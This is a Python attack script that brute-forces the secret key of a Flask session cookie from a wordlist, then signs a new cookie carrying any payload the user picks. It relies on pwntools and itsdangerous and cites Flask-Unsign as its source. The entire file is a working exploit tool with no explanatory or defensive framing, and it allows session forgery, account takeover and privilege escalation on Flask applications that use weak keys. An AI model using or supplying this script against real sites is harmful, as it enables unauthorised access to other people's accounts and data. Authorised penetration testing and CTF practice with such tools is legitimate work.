import sys, signal, argparse, json, time, hashlib
from pwn import *
from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature
from flask.json.tag import TaggedJSONSerializer

# ctrl + c
def signal_handler(signum, frame):
    log.failure("Interruption"); sys.exit()

signal.signal(signal.SIGINT, signal_handler)

# arguments
parser = argparse.ArgumentParser(description='Brute force attack "Secret key" of a Flask session cookie by default')
parser.add_argument('-cookie', type=str, required=True, help='session cookie to crack')
parser.add_argument('-payload', type=str, required=True, help="""new payload to create a valid session cookie ( '{"key":"value"}' )""")

args = parser.parse_args()

# create wordlist
def load_wordlist():
    with open('all.txt', 'r') as file:
        wordlist = file.readlines()
    return wordlist

# bruteforce cookie
def bruteforce_cookie(wordlist):
    p = log.progress('Starting Brute force attack')
    time.sleep(1)
    for secret in wordlist:
        secret = secret.strip('\n')
        p.status('{}'.format(secret))
        try:
            serializer = URLSafeTimedSerializer(
                        secret_key=secret,
                        salt='cookie-session',
                        serializer=TaggedJSONSerializer(),
                        signer=TimestampSigner,
                        signer_kwargs={
                                'key_derivation' : 'hmac',
                                'digest_method' : hashlib.sha1
                            }
                        ).loads(args.cookie)
            log.info('Payload : {}'.format(serializer))
        except BadSignature:
            continue
        log.success("Secret key : {}".format(secret))
        return secret

# craft cookie
def create_cookie(secret_key):
    time.sleep(1)
    p = log.progress('Creating new cookie with the payload')
    p.status(args.payload)
    try:
        serializer =  URLSafeTimedSerializer(
                            secret_key=secret_key, 
                            salt='cookie-session', 
                            serializer=TaggedJSONSerializer(), 
                            signer=TimestampSigner, 
                            signer_kwargs={
                                'key_derivation':'hmac',
                                'digest_method': hashlib.sha1
                                }
                            ).dumps(json.loads(args.payload))
        log.success('Cookie : {}'.format(serializer))
    except Exception as e:
        p.failure('{} ocurred'.format(e))

if __name__ == '__main__':
    key = bruteforce_cookie(load_wordlist())
    create_cookie(key)

# References
#---------------------------------------------------
#https://github.com/Paradoxis/Flask-Unsign
#https://github.com/Paradoxis/Flask-Unsign-Wordlist
